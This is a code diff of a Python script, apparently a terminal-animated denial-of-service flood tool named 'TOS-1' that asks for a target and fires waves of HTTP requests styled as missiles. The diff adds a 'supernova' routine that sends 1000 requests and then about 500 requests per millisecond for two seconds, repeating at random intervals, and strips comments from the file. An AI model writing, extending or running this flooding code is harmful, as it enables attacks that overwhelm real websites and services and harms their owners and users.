@@ -8,11 +8,11 @@ import shutil
 # Terminal size
 TERMINAL_SIZE = shutil.get_terminal_size((80, 40))
 TERMINAL_WIDTH = TERMINAL_SIZE.columns
-TERMINAL_HEIGHT = TERMINAL_SIZE.lines - 2  # leave 2 lines at bottom
+TERMINAL_HEIGHT = TERMINAL_SIZE.lines - 2
 
 # Clear terminal
 def clear():
-    print("\033[H\033[J", end="")  # ANSI clear for Termux
+    print("\033[H\033[J", end="")
 
 # Countdown loader
 async def countdown_loader(seconds):
@@ -40,14 +40,17 @@ EXHAUST_FRAMES = [
 
 # Missile types: speed -> request batch
 MISSILE_BATCHES = {
-    1: 50,     # avg
-    2: 200,    # ballistic
-    3: 300,    # hypersonic
-    4: 1000    # Shark-Z3 ultra
+    1: 50,
+    2: 200,
+    3: 300,
+    4: 1000
 }
 
-ULTRA_SUPER_BATCH = 3500  # new missile every 5s
-LAST_BATCH = 500          # new missile every 0.5s
+ULTRA_SUPER_BATCH = 3500
+LAST_BATCH = 500
+
+SUPERNOVA_INITIAL = 1000
+SUPERNOVA_STREAM = 50 * 10  # 50/ms × 10 = 500/ms
 
 class Missile:
     def __init__(self, speed=None):
@@ -115,6 +118,24 @@ async def last_missile(target, duration):
         asyncio.create_task(send_requests(target, LAST_BATCH))
         await asyncio.sleep(0.5)
 
+# Supernova missile
+async def supernova_missile(target, duration):
+    start_time = time.time()
+    while time.time() - start_time < duration:
+        delay = random.uniform(5, 10)
+        await asyncio.sleep(delay)
+
+        # Initial 1000 requests
+        asyncio.create_task(send_requests(target, SUPERNOVA_INITIAL))
+
+        # Stream of 500/ms while rising (~2s flight)
+        async def stream():
+            t_end = time.time() + 2
+            while time.time() < t_end:
+                asyncio.create_task(send_requests(target, SUPERNOVA_STREAM))
+                await asyncio.sleep(0.001)
+        asyncio.create_task(stream())
+
 # Main loop
 async def main():
     target = input("¿TARGZ > ")
@@ -122,11 +143,12 @@ async def main():
 
     await countdown_loader(5)
 
-    missiles = [Missile() for _ in range(2)]  # mini swarm
+    missiles = [Missile() for _ in range(2)]
 
     # Start heavy missiles
     asyncio.create_task(ultra_super_missile(target, duration))
     asyncio.create_task(last_missile(target, duration))
+    asyncio.create_task(supernova_missile(target, duration))
 
     start_time = time.time()
     last_launch_times = [0]*len(missiles)
@@ -142,11 +164,8 @@ async def main():
         draw_missiles(missiles)
         await asyncio.sleep(0.05)
 
-    print("=== TOS-1: Attack Complete ===")
-
 if __name__ == "__main__":
     try:
         asyncio.run(main())
     except KeyboardInterrupt:
         clear()
-        print("TOS-1 terminated by user.")
